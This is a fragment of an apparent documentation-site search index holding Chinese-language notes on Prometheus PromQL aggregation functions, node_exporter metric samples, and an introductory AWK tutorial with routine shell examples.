\u652f\u6301\u53c2\u6570(parameter)\u3002 without\u7528\u4e8e\u4ece\u8ba1\u7b97\u7ed3\u679c\u4e2d\u79fb\u9664\u5217\u4e3e\u7684\u6807\u7b7e\uff0c\u800c\u4fdd\u7559\u5176\u5b83\u6807\u7b7e\u3002by\u5219\u6b63\u597d\u76f8\u53cd\uff0c\u7ed3\u679c\u5411\u91cf\u4e2d\u53ea\u4fdd\u7559\u5217\u51fa\u7684\u6807\u7b7e\uff0c\u5176\u4f59\u6807\u7b7e\u5219\u79fb\u9664\u3002\u901a\u8fc7without\u548cby\u53ef\u4ee5\u6309\u7167\u6837\u672c\u7684\u95ee\u9898\u5bf9\u6570\u636e\u8fdb\u884c\u805a\u5408\u3002 \u4f8b\u5982\uff1a sum(http_requests_total) without (instance) \u7b49\u4ef7\u4e8e sum(http_requests_total) by (code,handler,job,method) \u5982\u679c\u53ea\u9700\u8981\u8ba1\u7b97\u6574\u4e2a\u5e94\u7528\u7684HTTP\u8bf7\u6c42\u603b\u91cf\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u8868\u8fbe\u5f0f\uff1a sum(http_requests_total) count_values\u7528\u4e8e\u65f6\u95f4\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a\u6837\u672c\u503c\u51fa\u73b0\u7684\u6b21\u6570\u3002count_values\u4f1a\u4e3a\u6bcf\u4e00\u4e2a\u552f\u4e00\u7684\u6837\u672c\u503c\u8f93\u51fa\u4e00\u4e2a\u65f6\u95f4\u5e8f\u5217\uff0c\u5e76\u4e14\u6bcf\u4e00\u4e2a\u65f6\u95f4\u5e8f\u5217\u5305\u542b\u4e00\u4e2a\u989d\u5916\u7684\u6807\u7b7e\u3002 \u4f8b\u5982\uff1a count_values(\"count\", http_requests_total) topk\u548cbottomk\u5219\u7528\u4e8e\u5bf9\u6837\u672c\u503c\u8fdb\u884c\u6392\u5e8f\uff0c\u8fd4\u56de\u5f53\u524d\u6837\u672c\u503c\u524dn\u4f4d\uff0c\u6216\u8005\u540en\u4f4d\u7684\u65f6\u95f4\u5e8f\u5217\u3002 \u83b7\u53d6HTTP\u8bf7\u6c42\u6570\u524d5\u4f4d\u7684\u65f6\u5e8f\u6837\u672c\u6570\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\uff1a topk(5, http_requests_total) quantile\u7528\u4e8e\u8ba1\u7b97\u5f53\u524d\u6837\u672c\u6570\u636e\u503c\u7684\u5206\u5e03\u60c5\u51b5quantile(\u03c6, express)\u5176\u4e2d0 \u2264 \u03c6 \u2264 1\u3002 \u4f8b\u5982\uff0c\u5f53\u03c6\u4e3a0.5\u65f6\uff0c\u5373\u8868\u793a\u627e\u5230\u5f53\u524d\u6837\u672c\u6570\u636e\u4e2d\u7684\u4e2d\u4f4d\u6570\uff1a quantile(0.5, http_requests_total)","title":"\u805a\u5408\u51fd\u6570\uff1a"},{"location":"monitor/prometheus/query_xamples/","text":"Prometheus\u76d1\u63a7\u67e5\u8be2\u4f8b\u5b50 \u4f8b\uff1a # HELP node_procs_running Number of processes in runnable state. # TYPE node_procs_running gauge node_procs_running 4 \u8be5\u6570\u636e\u8868\u793a\u7cfb\u7edf\u4e2d\u6b63\u5728\u8fd0\u884c\u548c\u53ef\u8fd0\u884c\u72b6\u6001\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u901a\u8fc7\u9875\u9762\u67e5\u8be2\u53d1\u73b0\u662f4\uff0c\u800c\u4e14\u662fgauge\uff0c\u662f\u4e2a\u53ef\u589e\u53ef\u51cf\u7684\u503c \u5728Prometheus\u4e0a\u67e5\u8be2 \u53ef\u4ee5\u67e5\u8be2\u5230\u4e00\u4e2a\u6570\u636e\uff0c\u56e0\u4e3a\u8be5\u76d1\u63a7\u662f\u7531node_exporter\u63d0\u4f9b\u7684\uff0c\u6240\u4ee5\u53ea\u80fd\u67e5\u5230\u4e00\u4e2a\u6570\u636e \u53d1\u73b0\u8be5\u6570\u636e\u589e\u52a0\u4e86\u4e24\u4e2a\u6807\u7b7e\uff0c\u731c\u6d4b\u662f\u56e0\u4e3aPrometheus\u914d\u7f6e\u63d0\u4f9b\u7684\u3002 \u7136\u540e\u67e5\u8be2\u8be5\u6570\u636e\u7684\u56fe\u8c31\uff1a \u4f8b\uff1a # HELP node_cpu_seconds_total Seconds the cpus spent in each mode. # TYPE node_cpu_seconds_total counter node_cpu_seconds_total{cpu=\"0\",mode=\"idle\"} 12463.13 node_cpu_seconds_total{cpu=\"0\",mode=\"iowait\"} 2.32 node_cpu_seconds_total{cpu=\"0\",mode=\"irq\"} 0 node_cpu_seconds_total{cpu=\"0\",mode=\"nice\"} 0.04 node_cpu_seconds_total{cpu=\"0\",mode=\"softirq\"} 0.21 node_cpu_seconds_total{cpu=\"0\",mode=\"steal\"} 0 node_cpu_seconds_total{cpu=\"0\",mode=\"system\"} 6.16 node_cpu_seconds_total{cpu=\"0\",mode=\"user\"} 3.18 node_cpu_seconds_total{cpu=\"1\",mode=\"idle\"} 12458.04 node_cpu_seconds_total{cpu=\"1\",mode=\"iowait\"} 0.58 node_cpu_seconds_total{cpu=\"1\",mode=\"irq\"} 0 node_cpu_seconds_total{cpu=\"1\",mode=\"nice\"} 0.02 node_cpu_seconds_total{cpu=\"1\",mode=\"softirq\"} 0.37 node_cpu_seconds_total{cpu=\"1\",mode=\"steal\"} 0 node_cpu_seconds_total{cpu=\"1\",mode=\"system\"} 9.62 node_cpu_seconds_total{cpu=\"1\",mode=\"user\"} 1.89 CPU\u5728\u6bcf\u79cd\u72b6\u6001\u4e0b\u7684CPU\u65f6\u95f4\uff0c\u662f\u4e2acounter \u7c7b\u578b \u770b\u6765\u6807\u7b7e\u4f1a\u6839\u636e\u914d\u7f6e\u6587\u4ef6\u81ea\u52a8\u52a0\u4e0a\u7684\u3002\u67e5\u8be2\u5176\u4e2d\u4e00\u4e2a\u503c\u76842\u5c0f\u65f6\u7684\u6570\u636e\u56fe\u8c31","title":"Prometheus\u76d1\u63a7\u67e5\u8be2\u4f8b\u5b50"},{"location":"monitor/prometheus/query_xamples/#prometheus","text":"\u4f8b\uff1a # HELP node_procs_running Number of processes in runnable state. # TYPE node_procs_running gauge node_procs_running 4 \u8be5\u6570\u636e\u8868\u793a\u7cfb\u7edf\u4e2d\u6b63\u5728\u8fd0\u884c\u548c\u53ef\u8fd0\u884c\u72b6\u6001\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u901a\u8fc7\u9875\u9762\u67e5\u8be2\u53d1\u73b0\u662f4\uff0c\u800c\u4e14\u662fgauge\uff0c\u662f\u4e2a\u53ef\u589e\u53ef\u51cf\u7684\u503c \u5728Prometheus\u4e0a\u67e5\u8be2 \u53ef\u4ee5\u67e5\u8be2\u5230\u4e00\u4e2a\u6570\u636e\uff0c\u56e0\u4e3a\u8be5\u76d1\u63a7\u662f\u7531node_exporter\u63d0\u4f9b\u7684\uff0c\u6240\u4ee5\u53ea\u80fd\u67e5\u5230\u4e00\u4e2a\u6570\u636e \u53d1\u73b0\u8be5\u6570\u636e\u589e\u52a0\u4e86\u4e24\u4e2a\u6807\u7b7e\uff0c\u731c\u6d4b\u662f\u56e0\u4e3aPrometheus\u914d\u7f6e\u63d0\u4f9b\u7684\u3002 \u7136\u540e\u67e5\u8be2\u8be5\u6570\u636e\u7684\u56fe\u8c31\uff1a \u4f8b\uff1a # HELP node_cpu_seconds_total Seconds the cpus spent in each mode. # TYPE node_cpu_seconds_total counter node_cpu_seconds_total{cpu=\"0\",mode=\"idle\"} 12463.13 node_cpu_seconds_total{cpu=\"0\",mode=\"iowait\"} 2.32 node_cpu_seconds_total{cpu=\"0\",mode=\"irq\"} 0 node_cpu_seconds_total{cpu=\"0\",mode=\"nice\"} 0.04 node_cpu_seconds_total{cpu=\"0\",mode=\"softirq\"} 0.21 node_cpu_seconds_total{cpu=\"0\",mode=\"steal\"} 0 node_cpu_seconds_total{cpu=\"0\",mode=\"system\"} 6.16 node_cpu_seconds_total{cpu=\"0\",mode=\"user\"} 3.18 node_cpu_seconds_total{cpu=\"1\",mode=\"idle\"} 12458.04 node_cpu_seconds_total{cpu=\"1\",mode=\"iowait\"} 0.58 node_cpu_seconds_total{cpu=\"1\",mode=\"irq\"} 0 node_cpu_seconds_total{cpu=\"1\",mode=\"nice\"} 0.02 node_cpu_seconds_total{cpu=\"1\",mode=\"softirq\"} 0.37 node_cpu_seconds_total{cpu=\"1\",mode=\"steal\"} 0 node_cpu_seconds_total{cpu=\"1\",mode=\"system\"} 9.62 node_cpu_seconds_total{cpu=\"1\",mode=\"user\"} 1.89 CPU\u5728\u6bcf\u79cd\u72b6\u6001\u4e0b\u7684CPU\u65f6\u95f4\uff0c\u662f\u4e2acounter \u7c7b\u578b \u770b\u6765\u6807\u7b7e\u4f1a\u6839\u636e\u914d\u7f6e\u6587\u4ef6\u81ea\u52a8\u52a0\u4e0a\u7684\u3002\u67e5\u8be2\u5176\u4e2d\u4e00\u4e2a\u503c\u76842\u5c0f\u65f6\u7684\u6570\u636e\u56fe\u8c31","title":"Prometheus\u76d1\u63a7\u67e5\u8be2\u4f8b\u5b50"},{"location":"programming_language/","text":"\u4e00\u4e9b\u7f16\u7a0b\u8bed\u8a00\u7684\u8bb0\u5f55","title":"\u4e00\u4e9b\u7f16\u7a0b\u8bed\u8a00\u7684\u8bb0\u5f55"},{"location":"programming_language/#_1","text":"","title":"\u4e00\u4e9b\u7f16\u7a0b\u8bed\u8a00\u7684\u8bb0\u5f55"},{"location":"programming_language/awk/","text":"Awk AWK \u662f\u4e00\u79cd\u4f18\u826f\u7684 \u6587\u672c\u5904\u7406 \u5de5\u5177\uff0c Linux \u53ca Unix \u73af\u5883\u4e2d\u73b0\u6709\u7684\u529f\u80fd\u6700\u5f3a\u5927\u7684 \u6570\u636e\u5904\u7406 \u5f15\u64ce\u4e4b\u4e00\u3002\u8fd9\u79cd\u7f16\u7a0b\u53ca\u6570\u636e\u64cd\u4f5c\u8bed\u8a00\uff08\u5176\u540d\u79f0\u5f97\u81ea\u4e8e\u5b83\u7684\u521b\u59cb\u4eba \u963f\u5c14\u4f5b\u96f7\u5fb7\u00b7\u827e\u4faf \u3001 \u5f7c\u5f97\u00b7\u6e29\u4f2f\u683c \u548c \u5e03\u83b1\u6069\u00b7\u67ef\u6797\u6c49 \u59d3\u6c0f\u7684\u9996\u4e2a\u5b57\u6bcd\uff09\u7684\u6700\u5927\u529f\u80fd\u53d6\u51b3\u4e8e\u4e00\u4e2a\u4eba\u6240\u62e5\u6709\u7684\u77e5\u8bc6\u3002AWK\u63d0\u4f9b\u4e86\u6781\u5176\u5f3a\u5927\u7684\u529f\u80fd\uff1a\u53ef\u4ee5\u8fdb\u884c\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5339\u914d\uff0c\u6837\u5f0f\u88c5\u5165\u3001\u6d41\u63a7\u5236\u3001\u6570\u5b66\u8fd0\u7b97\u7b26\u3001\u8fdb\u7a0b\u63a7\u5236\u8bed\u53e5\u751a\u81f3\u4e8e\u5185\u7f6e\u7684\u53d8\u91cf\u548c\u51fd\u6570\u3002\u5b83\u5177\u5907\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u8bed\u8a00\u6240\u5e94\u5177\u6709\u7684\u51e0\u4e4e\u6240\u6709\u7cbe\u7f8e\u7279\u6027\u3002\u5b9e\u9645\u4e0aAWK\u7684\u786e\u62e5\u6709\u81ea\u5df1\u7684\u8bed\u8a00\uff1aAWK \u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00 \uff0c\u4e09\u4f4d\u521b\u5efa\u8005\u5df2\u5c06\u5b83\u6b63\u5f0f\u5b9a\u4e49\u4e3a\u201c\u6837\u5f0f\u626b\u63cf\u548c\u5904\u7406\u8bed\u8a00\u201d\u3002\u5b83\u5141\u8bb8\u521b\u5efa\u7b80\u77ed\u7684\u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u7a0b\u5e8f\u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\u3001\u4e3a\u6570\u636e\u6392\u5e8f\u3001\u5904\u7406\u6570\u636e\u3001\u5bf9\u8f93\u5165\u6267\u884c\u8ba1\u7b97\u4ee5\u53ca\u751f\u6210\u62a5\u8868\uff0c\u8fd8\u6709\u65e0\u6570\u5176\u4ed6\u7684\u529f\u80fd\u3002gawk\u662fAWK\u7684GNU\u7248\u672c\u3002 \u6700\u7b80\u5355\u5730\u8bf4\uff0cAWK\u662f\u4e00\u79cd\u7528\u4e8e\u5904\u7406\u6587\u672c\u7684\u7f16\u7a0b\u8bed\u8a00\u5de5\u5177\u3002AWK\u5728\u5f88\u591a\u65b9\u9762\u7c7b\u4f3c\u4e8e Unix shell \u7f16\u7a0b\u8bed\u8a00\uff0c\u5c3d\u7ba1AWK\u5177\u6709\u5b8c\u5168\u5c5e\u4e8e\u5176\u672c\u8eab\u7684\u8bed\u6cd5\u3002\u5b83\u7684\u8bbe\u8ba1\u601d\u60f3\u6765\u6e90\u4e8e SNOBOL4 \u3001 sed \u3001Marc Rochkind\u8bbe\u8ba1\u7684\u6709\u6548\u6027\u8bed\u8a00\u3001\u8bed\u8a00\u5de5\u5177 yacc \u548c lex \uff0c\u5f53\u7136\u8fd8\u4ece C\u8bed\u8a00 \u4e2d\u83b7\u53d6\u4e86\u4e00\u4e9b\u4f18\u79c0\u7684\u601d\u60f3\u3002\u5728\u6700\u521d\u521b\u9020AWK\u65f6\uff0c\u5176\u76ee\u7684\u662f\u7528\u4e8e\u6587\u672c\u5904\u7406\uff0c\u5e76\u4e14\u8fd9\u79cd\u8bed\u8a00\u7684\u57fa\u7840\u662f\uff0c\u53ea\u8981\u5728\u8f93\u5165\u6570\u636e\u4e2d\u6709\u6a21\u5f0f\u5339\u914d\uff0c\u5c31\u6267\u884c\u4e00\u7cfb\u5217\u6307\u4ee4\u3002\u8be5\u5b9e\u7528\u5de5\u5177\u626b\u63cf\u6587\u4ef6\u4e2d\u7684\u6bcf\u4e00\u884c\uff0c\u67e5\u627e\u4e0e\u547d\u4ee4\u884c\u4e2d\u6240\u7ed9\u5b9a\u5185\u5bb9\u76f8\u5339\u914d\u7684\u6a21\u5f0f\u3002\u5982\u679c\u53d1\u73b0\u5339\u914d\u5185\u5bb9\uff0c\u5219\u8fdb\u884c\u4e0b\u4e00\u4e2a\u7f16\u7a0b\u6b65\u9aa4\u3002\u5982\u679c\u627e\u4e0d\u5230\u5339\u914d\u5185\u5bb9\uff0c\u5219\u7ee7\u7eed\u5904\u7406\u4e0b\u4e00\u884c\u3002 AWK - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)","title":"Awk"},{"location":"programming_language/awk/#awk","text":"AWK \u662f\u4e00\u79cd\u4f18\u826f\u7684 \u6587\u672c\u5904\u7406 \u5de5\u5177\uff0c Linux \u53ca Unix \u73af\u5883\u4e2d\u73b0\u6709\u7684\u529f\u80fd\u6700\u5f3a\u5927\u7684 \u6570\u636e\u5904\u7406 \u5f15\u64ce\u4e4b\u4e00\u3002\u8fd9\u79cd\u7f16\u7a0b\u53ca\u6570\u636e\u64cd\u4f5c\u8bed\u8a00\uff08\u5176\u540d\u79f0\u5f97\u81ea\u4e8e\u5b83\u7684\u521b\u59cb\u4eba \u963f\u5c14\u4f5b\u96f7\u5fb7\u00b7\u827e\u4faf \u3001 \u5f7c\u5f97\u00b7\u6e29\u4f2f\u683c \u548c \u5e03\u83b1\u6069\u00b7\u67ef\u6797\u6c49 \u59d3\u6c0f\u7684\u9996\u4e2a\u5b57\u6bcd\uff09\u7684\u6700\u5927\u529f\u80fd\u53d6\u51b3\u4e8e\u4e00\u4e2a\u4eba\u6240\u62e5\u6709\u7684\u77e5\u8bc6\u3002AWK\u63d0\u4f9b\u4e86\u6781\u5176\u5f3a\u5927\u7684\u529f\u80fd\uff1a\u53ef\u4ee5\u8fdb\u884c\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5339\u914d\uff0c\u6837\u5f0f\u88c5\u5165\u3001\u6d41\u63a7\u5236\u3001\u6570\u5b66\u8fd0\u7b97\u7b26\u3001\u8fdb\u7a0b\u63a7\u5236\u8bed\u53e5\u751a\u81f3\u4e8e\u5185\u7f6e\u7684\u53d8\u91cf\u548c\u51fd\u6570\u3002\u5b83\u5177\u5907\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u8bed\u8a00\u6240\u5e94\u5177\u6709\u7684\u51e0\u4e4e\u6240\u6709\u7cbe\u7f8e\u7279\u6027\u3002\u5b9e\u9645\u4e0aAWK\u7684\u786e\u62e5\u6709\u81ea\u5df1\u7684\u8bed\u8a00\uff1aAWK \u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00 \uff0c\u4e09\u4f4d\u521b\u5efa\u8005\u5df2\u5c06\u5b83\u6b63\u5f0f\u5b9a\u4e49\u4e3a\u201c\u6837\u5f0f\u626b\u63cf\u548c\u5904\u7406\u8bed\u8a00\u201d\u3002\u5b83\u5141\u8bb8\u521b\u5efa\u7b80\u77ed\u7684\u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u7a0b\u5e8f\u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\u3001\u4e3a\u6570\u636e\u6392\u5e8f\u3001\u5904\u7406\u6570\u636e\u3001\u5bf9\u8f93\u5165\u6267\u884c\u8ba1\u7b97\u4ee5\u53ca\u751f\u6210\u62a5\u8868\uff0c\u8fd8\u6709\u65e0\u6570\u5176\u4ed6\u7684\u529f\u80fd\u3002gawk\u662fAWK\u7684GNU\u7248\u672c\u3002 \u6700\u7b80\u5355\u5730\u8bf4\uff0cAWK\u662f\u4e00\u79cd\u7528\u4e8e\u5904\u7406\u6587\u672c\u7684\u7f16\u7a0b\u8bed\u8a00\u5de5\u5177\u3002AWK\u5728\u5f88\u591a\u65b9\u9762\u7c7b\u4f3c\u4e8e Unix shell \u7f16\u7a0b\u8bed\u8a00\uff0c\u5c3d\u7ba1AWK\u5177\u6709\u5b8c\u5168\u5c5e\u4e8e\u5176\u672c\u8eab\u7684\u8bed\u6cd5\u3002\u5b83\u7684\u8bbe\u8ba1\u601d\u60f3\u6765\u6e90\u4e8e SNOBOL4 \u3001 sed \u3001Marc Rochkind\u8bbe\u8ba1\u7684\u6709\u6548\u6027\u8bed\u8a00\u3001\u8bed\u8a00\u5de5\u5177 yacc \u548c lex \uff0c\u5f53\u7136\u8fd8\u4ece C\u8bed\u8a00 \u4e2d\u83b7\u53d6\u4e86\u4e00\u4e9b\u4f18\u79c0\u7684\u601d\u60f3\u3002\u5728\u6700\u521d\u521b\u9020AWK\u65f6\uff0c\u5176\u76ee\u7684\u662f\u7528\u4e8e\u6587\u672c\u5904\u7406\uff0c\u5e76\u4e14\u8fd9\u79cd\u8bed\u8a00\u7684\u57fa\u7840\u662f\uff0c\u53ea\u8981\u5728\u8f93\u5165\u6570\u636e\u4e2d\u6709\u6a21\u5f0f\u5339\u914d\uff0c\u5c31\u6267\u884c\u4e00\u7cfb\u5217\u6307\u4ee4\u3002\u8be5\u5b9e\u7528\u5de5\u5177\u626b\u63cf\u6587\u4ef6\u4e2d\u7684\u6bcf\u4e00\u884c\uff0c\u67e5\u627e\u4e0e\u547d\u4ee4\u884c\u4e2d\u6240\u7ed9\u5b9a\u5185\u5bb9\u76f8\u5339\u914d\u7684\u6a21\u5f0f\u3002\u5982\u679c\u53d1\u73b0\u5339\u914d\u5185\u5bb9\uff0c\u5219\u8fdb\u884c\u4e0b\u4e00\u4e2a\u7f16\u7a0b\u6b65\u9aa4\u3002\u5982\u679c\u627e\u4e0d\u5230\u5339\u914d\u5185\u5bb9\uff0c\u5219\u7ee7\u7eed\u5904\u7406\u4e0b\u4e00\u884c\u3002 AWK - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)","title":"Awk"},{"location":"programming_language/awk/awk/","text":"Awk AWK \u662f\u4e00\u79cd\u4f18\u826f\u7684 \u6587\u672c\u5904\u7406 \u5de5\u5177\uff0c Linux \u53ca Unix \u73af\u5883\u4e2d\u73b0\u6709\u7684\u529f\u80fd\u6700\u5f3a\u5927\u7684 \u6570\u636e\u5904\u7406 \u5f15\u64ce\u4e4b\u4e00\u3002\u8fd9\u79cd\u7f16\u7a0b\u53ca\u6570\u636e\u64cd\u4f5c\u8bed\u8a00\uff08\u5176\u540d\u79f0\u5f97\u81ea\u4e8e\u5b83\u7684\u521b\u59cb\u4eba \u963f\u5c14\u4f5b\u96f7\u5fb7\u00b7\u827e\u4faf \u3001 \u5f7c\u5f97\u00b7\u6e29\u4f2f\u683c \u548c \u5e03\u83b1\u6069\u00b7\u67ef\u6797\u6c49 \u59d3\u6c0f\u7684\u9996\u4e2a\u5b57\u6bcd\uff09\u7684\u6700\u5927\u529f\u80fd\u53d6\u51b3\u4e8e\u4e00\u4e2a\u4eba\u6240\u62e5\u6709\u7684\u77e5\u8bc6\u3002AWK\u63d0\u4f9b\u4e86\u6781\u5176\u5f3a\u5927\u7684\u529f\u80fd\uff1a\u53ef\u4ee5\u8fdb\u884c\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5339\u914d\uff0c\u6837\u5f0f\u88c5\u5165\u3001\u6d41\u63a7\u5236\u3001\u6570\u5b66\u8fd0\u7b97\u7b26\u3001\u8fdb\u7a0b\u63a7\u5236\u8bed\u53e5\u751a\u81f3\u4e8e\u5185\u7f6e\u7684\u53d8\u91cf\u548c\u51fd\u6570\u3002\u5b83\u5177\u5907\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u8bed\u8a00\u6240\u5e94\u5177\u6709\u7684\u51e0\u4e4e\u6240\u6709\u7cbe\u7f8e\u7279\u6027\u3002\u5b9e\u9645\u4e0aAWK\u7684\u786e\u62e5\u6709\u81ea\u5df1\u7684\u8bed\u8a00\uff1aAWK \u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00 \uff0c\u4e09\u4f4d\u521b\u5efa\u8005\u5df2\u5c06\u5b83\u6b63\u5f0f\u5b9a\u4e49\u4e3a\u201c\u6837\u5f0f\u626b\u63cf\u548c\u5904\u7406\u8bed\u8a00\u201d\u3002\u5b83\u5141\u8bb8\u521b\u5efa\u7b80\u77ed\u7684\u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u7a0b\u5e8f\u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\u3001\u4e3a\u6570\u636e\u6392\u5e8f\u3001\u5904\u7406\u6570\u636e\u3001\u5bf9\u8f93\u5165\u6267\u884c\u8ba1\u7b97\u4ee5\u53ca\u751f\u6210\u62a5\u8868\uff0c\u8fd8\u6709\u65e0\u6570\u5176\u4ed6\u7684\u529f\u80fd\u3002gawk\u662fAWK\u7684GNU\u7248\u672c\u3002 \u6700\u7b80\u5355\u5730\u8bf4\uff0cAWK\u662f\u4e00\u79cd\u7528\u4e8e\u5904\u7406\u6587\u672c\u7684\u7f16\u7a0b\u8bed\u8a00\u5de5\u5177\u3002AWK\u5728\u5f88\u591a\u65b9\u9762\u7c7b\u4f3c\u4e8e Unix shell \u7f16\u7a0b\u8bed\u8a00\uff0c\u5c3d\u7ba1AWK\u5177\u6709\u5b8c\u5168\u5c5e\u4e8e\u5176\u672c\u8eab\u7684\u8bed\u6cd5\u3002\u5b83\u7684\u8bbe\u8ba1\u601d\u60f3\u6765\u6e90\u4e8e SNOBOL4 \u3001 sed \u3001Marc Rochkind\u8bbe\u8ba1\u7684\u6709\u6548\u6027\u8bed\u8a00\u3001\u8bed\u8a00\u5de5\u5177 yacc \u548c lex \uff0c\u5f53\u7136\u8fd8\u4ece C\u8bed\u8a00 \u4e2d\u83b7\u53d6\u4e86\u4e00\u4e9b\u4f18\u79c0\u7684\u601d\u60f3\u3002\u5728\u6700\u521d\u521b\u9020AWK\u65f6\uff0c\u5176\u76ee\u7684\u662f\u7528\u4e8e\u6587\u672c\u5904\u7406\uff0c\u5e76\u4e14\u8fd9\u79cd\u8bed\u8a00\u7684\u57fa\u7840\u662f\uff0c\u53ea\u8981\u5728\u8f93\u5165\u6570\u636e\u4e2d\u6709\u6a21\u5f0f\u5339\u914d\uff0c\u5c31\u6267\u884c\u4e00\u7cfb\u5217\u6307\u4ee4\u3002\u8be5\u5b9e\u7528\u5de5\u5177\u626b\u63cf\u6587\u4ef6\u4e2d\u7684\u6bcf\u4e00\u884c\uff0c\u67e5\u627e\u4e0e\u547d\u4ee4\u884c\u4e2d\u6240\u7ed9\u5b9a\u5185\u5bb9\u76f8\u5339\u914d\u7684\u6a21\u5f0f\u3002\u5982\u679c\u53d1\u73b0\u5339\u914d\u5185\u5bb9\uff0c\u5219\u8fdb\u884c\u4e0b\u4e00\u4e2a\u7f16\u7a0b\u6b65\u9aa4\u3002\u5982\u679c\u627e\u4e0d\u5230\u5339\u914d\u5185\u5bb9\uff0c\u5219\u7ee7\u7eed\u5904\u7406\u4e0b\u4e00\u884c\u3002 AWK - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u529f\u80fd\uff1a\u5904\u7406\u6587\u672c\u6587\u4ef6\uff0c\u5bf9\u6587\u672c\u6570\u636e\u8fdb\u884c\u6c47\u603b\u548c\u5904\u7406\uff0c\u751f\u6210\u62a5\u544a\uff0c\u5bf9\u6587\u4ef6\u8fdb\u884c\u6392\u7248 [root@shell shelldoc]# which awk /bin/awk [root@shell shelldoc]# ll /bin/awk lrwxrwxrwx. 1 root root 4 Jul 22 15:36 /bin/awk -> gawk [root@shell shelldoc]# ll /bin/gawk -rwxr-xr-x. 1 root root 382456 Jul 4 2012 /bin/gawk awk\u5de5\u4f5c\u8fc7\u7a0b\uff0c\u4e00\u884c\u4e00\u884c\u5904\u7406 \u5c06\u6587\u672c\u6587\u4ef6\u7684\u5185\u5bb9\u9010\u884c\u626b\u63cf\uff0c\u5c06\u6574\u884c\u7684\u5185\u5bb9\u4fdd\u5b58\u5230\u53d8\u91cf$0\u4e2d \u6309\u7167\u6307\u5b9a\u7684\u5206\u9694\u7b26\u5c06\u8f93\u5165\u7684\u884c\u5207\u6210\u82e5\u5e72\u7684\u5217(\u5b57\u6bb5)\uff0c\u5b58\u5165$1\uff0c$2\uff0c$3....\u53d8\u91cf\u4e2d\uff0c\u518d\u4f7f\u7528\u547d\u4ee4(print/printf)\u5c06\u53d8\u91cf\u6253\u5370\u8f93\u51fa\uff0c\u518d\u8bfb\u53d6\u4e0b\u4e00\u884c\uff0c\u76f4\u5230\u6587\u4ef6\u90fd\u8bfb\u53d6\u5b8c\u6bd5\uff0cawk\u7ed3\u675f\u3002 \u9ed8\u8ba4\u7684\u8f93\u5165\u5206\u9694\u7b26\uff1a\u7a7a\u767d \u53d6\u51fa\u672c\u673a\u7684IP\u5730\u5740 [root@shell shelldoc]# ifconfig eth0 | grep -i bcast | awk '{print $2}' addr:172.16.254.200 [root@shell shelldoc]# ifconfig eth0 | grep -i bcast | awk '{print $2}' | awk -F: '{print $2}' 172.16.254.200 \u4e00\u3001awk \u8bed\u6cd5 awk [\u9009\u9879] '/\u6a21\u5f0f\u5339\u914d(\u5b9a\u5740)/{\u52a8\u4f5c1\uff1b\u52a8\u4f5c2\uff1b....}' \u6587\u4ef6\u5217\u8868 -f\uff1a\u6307\u5b9a\u6267\u884c\u7684awk\u811a\u672c\u7684 -F\uff1a\u6307\u5b9a\u5b57\u6bb5\u5206\u9694\u7b26 \u5206\u9694\u7b26 \u5206\u9694\u7b26\u53ef\u4ee5\u662f\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7b26\u53f7\u548c\u7a7a\u767d\uff0c\u53ef\u4ee5\u540c\u65f6\u6307\u5b9a\u591a\u4e2a\u5206\u9694\u7b26 1\uff09\u5355\u4e2a\u7b26\u53f7\u4f5c\u4e3a\u5206\u9694\u7b26 [root@shell shelldoc]# awk -F \":\" '{print $1}' pass 2\uff09\u590d\u5408\u5206\u9694\u7b26 \u591a\u4e2a\u5b57\u7b26\u770b\u6210\u4e00\u4e2a :/ [root@shell shelldoc]# awk -F\":/\" '{print $1}' pass | head -3 root:x:0:0:root bin:x:1:1:bin daemon:x:2:2:daemon 3\uff09\u540c\u65f6\u6307\u5b9a\u591a\u4e2a\u5206\u9694\u7b26 \uff1a / [root@shell shelldoc]# awk -F\"[:/]\" '{print $8}' pass 4\uff09\u4ee5\u7a7a\u4e3a\u5206\u9694\u7b26\uff0c\u6253\u5370\u6bcf\u884c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u548c\u7b2c\u4e8c\u4e2a\u5b57\u7b26 [root@shell shelldoc]# awk -F \"\" '{print $1,$2}' pass -F\u548c\u53cc\u5f15\u53f7\u4e4b\u95f4\u5fc5\u6709\u7a7a\u683c \u4e8c\u3001awk\u8f93\u51fa 1\uff09print print\u8f93\u51fa\u65f6\u6709\u6362\u884c \u6253\u5370\u5b57\u6bb5\u65f6\uff0c\u5982\u679c\u7528\u9017\u53f7\u5206\u9694\u591a\u4e2a\u5b57\u6bb5\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u5c31\u662f\u4ee5\u7a7a\u767d\u4e3a\u5206\u9694\u7b26 print\u65f6\u5019\uff0c\u540e\u9762\u4e0d\u52a0\u5b57\u6bb5\uff0c\u9ed8\u8ba4\u6253\u5370\u6574\u884c \u200b 